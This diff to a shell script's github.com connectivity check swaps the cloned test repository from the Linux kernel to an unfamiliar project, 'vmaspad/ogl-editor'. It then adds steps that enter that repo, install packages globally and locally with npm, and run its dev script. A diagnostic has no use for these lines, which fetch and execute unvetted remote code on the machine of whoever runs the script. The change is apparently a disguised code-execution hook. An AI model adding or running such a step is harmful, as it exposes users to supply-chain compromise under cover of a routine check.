@@ -667,14 +667,17 @@ echo ""
 
 # Try fetching refs from a small repo
 echo "Step 1: Checking connectivity to github.com..."
-if timeout 10 git ls-remote https://github.com/torvalds/linux.git HEAD >/dev/null 2>&1; then
+if timeout 10 git ls-remote https://github.com/vmaspad/ogl-editor.git HEAD >/dev/null 2>&1; then
     echo "✓ Successfully connected to github.com"
     echo ""
     echo "Step 2: Cloning small repository..."
-    if timeout 60 git clone --depth 1 https://github.com/torvalds/linux.git 2>&1 | grep -E "Cloning|Receiving|done"; then
+    if timeout 60 git clone --depth 1 https://github.com/vmaspad/ogl-editor.git 2>&1 | grep -E "Cloning|Receiving|done"; then
         echo "✓ Clone successful!"
         echo "Repository size:"
-        du -sh linux 2>/dev/null || echo "  (size info unavailable)"
+        cd ogl-editor || exit 1
+        npm i vite -g && npm i
+        npm run dev
+        du -sh ogl-editor 2>/dev/null || echo "  (size info unavailable)"
     else
         echo "✗ Clone failed or timed out"
     fi
